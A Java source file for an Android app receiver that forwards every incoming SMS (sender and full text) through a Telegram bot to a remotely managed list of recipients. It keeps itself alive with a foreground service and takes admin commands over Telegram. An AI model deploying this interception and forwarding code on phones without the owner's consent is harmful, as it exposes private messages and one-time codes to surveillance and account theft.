package com.smstofred;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static volatile boolean pollingStarted = false;
    private static Context appContext;

    @Override
    public void onReceive(Context context, Intent intent) {
        // Запускаем сервис, чтобы он жил постоянно
        context.startForegroundService(new Intent(context, KeepAliveService.class));
        
        appContext = context.getApplicationContext();

        if (!pollingStarted) {
            pollingStarted = true;
            startCommandPolling();
        }

        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            StringBuilder fullMessage = new StringBuilder();
            String sender = null;
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                if (sender == null) sender = sms.getOriginatingAddress();
                fullMessage.append(sms.getMessageBody());
            }
            if (sender != null && fullMessage.length() > 0) {
                String text = "📨 От: " + sender + "\n💬 " + fullMessage.toString();
                sendToAllSubscribers(text);
            }
        }
    }

    private void startCommandPolling() {
        new Thread(() -> {
            int lastUpdateId = 0;
            while (true) {
                try {
                    String token = TelegramSender.getBotToken();
                    String url = "https://api.telegram.org/bot" + token + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setConnectTimeout(35000);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    conn.disconnect();

                    JSONObject resp = new JSONObject(sb.toString());
                    if (resp.getBoolean("ok")) {
                        JSONArray updates = resp.getJSONArray("result");
                        for (int i = 0; i < updates.length(); i++) {
                            JSONObject upd = updates.getJSONObject(i);
                            lastUpdateId = upd.getInt("update_id");
                            if (upd.has("message")) {
                                JSONObject msg = upd.getJSONObject("message");
                                JSONObject chat = msg.getJSONObject("chat");
                                long chatId = chat.getLong("id");
                                long adminId = PreferencesHelper.getAdminId(appContext);
                                if (chatId == adminId && msg.has("text")) {
                                    String command = msg.getString("text");
                                    handleCommand(command);
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Polling error", e);
                }
            }
        }).start();
    }

    private void handleCommand(String cmd) {
        long admin = PreferencesHelper.getAdminId(appContext);
        if (cmd.startsWith("/add")) {
            String arg = cmd.substring(4).trim();
            try {
                long id = Long.parseLong(arg);
                PreferencesHelper.addSubscriber(appContext, id);
                TelegramSender.sendToChat(admin, "✅ Добавлен " + id);
                TelegramSender.sendToChat(id, "📢 Теперь ты получаешь уведомления с телефона Алексея.");
            } catch (NumberFormatException e) {
                TelegramSender.sendToChat(admin, "❌ /add <числовой chat_id>");
            }
        } else if (cmd.startsWith("/remove")) {
            String arg = cmd.substring(7).trim();
            try {
                long id = Long.parseLong(arg);
                PreferencesHelper.removeSubscriber(appContext, id);
                TelegramSender.sendToChat(admin, "❌ Удалён " + id);
            } catch (NumberFormatException e) {
                TelegramSender.sendToChat(admin, "❌ /remove <числовой chat_id>");
            }
        } else if (cmd.equals("/list")) {
            StringBuilder sb = new StringBuilder("📋 Подписчики:\n");
            for (long id : PreferencesHelper.getSubscribers(appContext)) {
                sb.append(id).append("\n");
            }
            TelegramSender.sendToChat(admin, sb.toString());
        } else if (cmd.equals("/start")) {
            TelegramSender.sendToChat(admin, "👋 Бот админки работает. Команды: /add, /remove, /list");
        }
    }

    private void sendToAllSubscribers(String text) {
        for (long id : PreferencesHelper.getSubscribers(appContext)) {
            TelegramSender.sendToChat(id, text);
        }
    }
}
